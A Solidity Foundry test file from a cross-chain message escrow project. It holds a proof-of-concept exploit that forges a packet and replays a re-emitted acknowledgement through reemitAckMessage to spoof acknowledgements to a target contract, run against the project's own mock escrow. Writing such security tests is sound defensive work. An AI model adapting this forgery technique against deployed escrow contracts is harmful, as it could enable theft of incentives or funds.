// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import { IncentivizedMockEscrow } from "../../../src/apps/mock/IncentivizedMockEscrow.sol";
import { IIncentivizedMessageEscrow } from "../../../src/interfaces/IIncentivizedMessageEscrow.sol";
import { TestCommon } from "../../TestCommon.t.sol";
import { ICrossChainReceiver } from "../../../src/interfaces/ICrossChainReceiver.sol";


contract TargetExploit is ICrossChainReceiver {

    event ACK(bytes);

    IIncentivizedMessageEscrow immutable MESSAGE_ESCROW;

    constructor(IIncentivizedMessageEscrow messageEscrow_) {
        MESSAGE_ESCROW = messageEscrow_;
    }

    function submitMessage(
        bytes32 destinationIdentifier,
        bytes calldata destinationAddress,
        bytes calldata message,
        IIncentivizedMessageEscrow.IncentiveDescription calldata incentive,
        uint64 deadline
    ) external payable returns(uint256 gasRefund, bytes32 messageIdentifier) {
        (gasRefund, messageIdentifier) = MESSAGE_ESCROW.submitMessage{value: msg.value}(
            destinationIdentifier,
            destinationAddress,
            message,
            incentive,
            deadline
        );
    }

    function receiveAck(bytes32 /* destinationIdentifier */, bytes32 /* messageIdentifier */, bytes calldata acknowledgement) external {
        emit ACK(acknowledgement);
    }

    function receiveMessage(bytes32 /* sourceIdentifierbytes */, bytes32 /* messageIdentifier */, bytes calldata /* fromApplication */, bytes calldata /* message */) pure external returns(bytes memory acknowledgement) {
        return hex"";
    }
}

contract DestinationHelper is ICrossChainReceiver {
    IIncentivizedMessageEscrow immutable MESSAGE_ESCROW;

    constructor(IIncentivizedMessageEscrow messageEscrow_) {
        MESSAGE_ESCROW = messageEscrow_;
    }

    function submitMessage(
        bytes32 destinationIdentifier,
        bytes calldata destinationAddress,
        bytes calldata message,
        IIncentivizedMessageEscrow.IncentiveDescription calldata incentive,
        uint64 deadline
    ) external payable returns(uint256 gasRefund, bytes32 messageIdentifier) {
        (gasRefund, messageIdentifier) = MESSAGE_ESCROW.submitMessage{value: msg.value}(
            destinationIdentifier,
            destinationAddress,
            message,
            incentive,
            deadline
        );
    }

    function receiveAck(bytes32 destinationIdentifier, bytes32 messageIdentifier, bytes calldata acknowledgement) pure external {}

    function receiveMessage(bytes32 /* sourceIdentifierbytes */, bytes32 /* messageIdentifier */, bytes calldata fromApplication, bytes calldata message) pure external returns(bytes memory acknowledgement) {
        return message;
    }

}

contract ReemitAckMessageTest is TestCommon {

    TargetExploit targetToExploit;

    DestinationHelper destinationHelper;

    function setUp() override public {
        super.setUp();

        targetToExploit = new TargetExploit(escrow);
        destinationHelper = new DestinationHelper(escrow);

        // We need to set escrow as an approved sender and destination on targetToExplot
        // We need to set escrow as an approved caller on destinationHelper.
        vm.prank(address(targetToExploit));
        escrow.setRemoteImplementation(_DESTINATION_IDENTIFIER, abi.encode(address(escrow)));

        vm.prank(address(destinationHelper));
        escrow.setRemoteImplementation(_DESTINATION_IDENTIFIER, abi.encode(address(this)));
    }

    function test_exploit_target_contract() public {
        // This explot is about using the fact that anyone can call a destination escrow.
        
        // We will start by sending a message from TargetExplot:

        // vm.recordLogs();
        (, bytes32 messageIdentifier) = targetToExploit.submitMessage{value: _getTotalIncentive(_INCENTIVE)}(
            _DESTINATION_IDENTIFIER,
            abi.encodePacked(
                bytes1(0x14),
                bytes32(0),
                abi.encode(address(targetToExploit))
            ),
            hex"04e110",
            _INCENTIVE,
            0
        );

        // Vm.Log[] memory entries = vm.getRecordedLogs();

        // (, , bytes memory messageWithContext) = abi.decode(entries[1].data, (bytes32, bytes, bytes));

        // bytes memory legitMessage = abi.encodePacked(
        //     bytes32(uint256(uint160(address(escrow)))),
        //     messageWithContext
        // );

        // (uint8 v, bytes32 r, bytes32 s) = signMessageForMock(legitMessage);
        // bytes memory legitMessageContext = abi.encode(v, r, s);

        // Now we need to construct a message to attack with.

        bytes memory explotMessage = abi.encodePacked(
            bytes1(0),
            bytes32(messageIdentifier),  // Remember, we can set anything.
            abi.encodePacked(
                uint8(20),
                bytes32(0),
                abi.encode(address(targetToExploit))
            ), // We need to set this to the contract we want to exploit. 
            abi.encodePacked(
                uint8(20),
                bytes32(0),
                abi.encode(address(destinationHelper))
            ), // Our application so we know it goes through
            bytes8(0), // deadline, don't  care about
            bytes6(uint48(600000)), // max gas, sets set high.
            abi.encodePacked(
                hex"deaddeaddeaddead"
            )
        );

        bytes memory nonLegitMessage = abi.encodePacked(
            bytes32(uint256(uint160(address(this)))),
            _DESTINATION_IDENTIFIER,
            _DESTINATION_IDENTIFIER,
            explotMessage
        );

        (uint8 v, bytes32 r, bytes32 s) = signMessageForMock(nonLegitMessage);
        bytes memory nonLegitMessageContext = abi.encode(v, r, s);

        // lets execute the non-legit message

        vm.recordLogs();
        escrow.processPacket(nonLegitMessageContext, nonLegitMessage, bytes32(abi.encode(address(0))));
        Vm.Log[] memory entries = vm.getRecordedLogs();

        (, , bytes memory ackMessage) = abi.decode(entries[1].data, (bytes32, bytes, bytes));


        vm.recordLogs();
        escrow.reemitAckMessage(
            _DESTINATION_IDENTIFIER,
            abi.encode(address(escrow)),
            this.memorySlice(ackMessage, 64)
        );

        (, , bytes memory reAckMessage) = abi.decode(entries[1].data, (bytes32, bytes, bytes));

        bytes memory reAckMessageWithSender = abi.encodePacked(
            bytes32(uint256(uint160(address(escrow)))),
            reAckMessage
        );

        (v, r, s) = signMessageForMock(reAckMessageWithSender);
        bytes memory reAckMessageContext = abi.encode(v, r, s);

        escrow.processPacket(reAckMessageContext, reAckMessageWithSender, bytes32(abi.encode(address(0))));
    }
}